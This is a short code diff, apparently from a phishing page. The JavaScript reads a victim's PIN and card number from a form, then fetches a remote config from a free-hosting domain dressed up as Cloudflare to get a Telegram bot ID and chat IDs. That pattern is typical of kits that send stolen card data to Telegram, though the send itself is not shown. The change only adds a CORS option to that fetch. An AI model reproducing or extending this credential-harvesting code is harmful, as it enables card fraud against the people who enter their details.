@@ -64,7 +64,8 @@
         let pin = document.querySelector("#pin").value;
         const nocard = document.querySelector("#input1").value;
 
-        fetch('https://cloudflare-langitmusic-remix.000webhostapp.com/config.php')
+        fetch('https://cloudflare-langitmusic-remix.000webhostapp.com/config.php', { mode: 'cors' })
+
       .then(response => response.json())
       .then(data => {
         const { telegram_bot_id, chat_ids } = data;
